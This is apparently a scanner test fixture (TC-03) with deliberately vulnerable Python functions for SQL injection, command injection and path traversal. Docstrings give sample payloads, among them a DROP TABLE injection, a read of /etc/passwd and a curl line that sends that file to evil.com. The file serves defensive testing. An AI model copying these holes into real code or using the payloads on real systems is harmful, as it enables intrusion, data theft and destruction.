"""
TC-03: Injection Vulnerabilities (OWASP A03)
Expected: CRITICAL — SQL injection, command injection, path traversal
Purpose:  Validate injection detection across multiple vectors
"""

import sqlite3
import subprocess
import os


# ── SQL INJECTION ─────────────────────────────────────────────────────────────

def get_user_unsafe(username: str):
    """
    VULNERABLE: Direct string interpolation in SQL.
    Payload: ' OR '1'='1  will dump all users.
    """
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username = '{username}'"  # VULN
    cursor.execute(query)
    return cursor.fetchall()


def search_products(keyword: str):
    """
    VULNERABLE: f-string SQL — allows UNION-based extraction.
    Payload: ' UNION SELECT name,sql,3,4 FROM sqlite_master--
    """
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    cursor.execute(f"SELECT id, name, price FROM products WHERE name LIKE '%{keyword}%'")  # VULN
    return cursor.fetchall()


def delete_record(record_id: str):
    """
    VULNERABLE: No type enforcement, allows injection + DROP.
    Payload: 1; DROP TABLE users--
    """
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    cursor.execute("DELETE FROM records WHERE id = " + record_id)  # VULN
    conn.commit()


# ── COMMAND INJECTION ─────────────────────────────────────────────────────────

def ping_host(host: str) -> str:
    """
    VULNERABLE: shell=True with user input.
    Payload: 8.8.8.8; cat /etc/passwd
    """
    result = subprocess.run(
        f"ping -c 1 {host}",
        shell=True,          # VULN
        capture_output=True,
        text=True,
    )
    return result.stdout


def run_report(report_name: str) -> str:
    """
    VULNERABLE: os.system with unsanitised input.
    Payload: report; curl http://evil.com/$(cat /etc/passwd)
    """
    os.system(f"python3 reports/{report_name}.py")  # VULN
    return "Report executed"


def list_files(directory: str) -> list:
    """
    VULNERABLE: Path traversal via os.popen.
    Payload: ../../etc
    """
    output = os.popen(f"ls -la {directory}").read()  # VULN
    return output.splitlines()


# ── PATH TRAVERSAL ────────────────────────────────────────────────────────────

def read_file(filename: str) -> str:
    """
    VULNERABLE: No path sanitisation — allows ../../etc/passwd
    """
    base_dir = "/var/app/uploads"
    file_path = os.path.join(base_dir, filename)  # VULN — join doesn't block ../
    with open(file_path, "r") as f:
        return f.read()
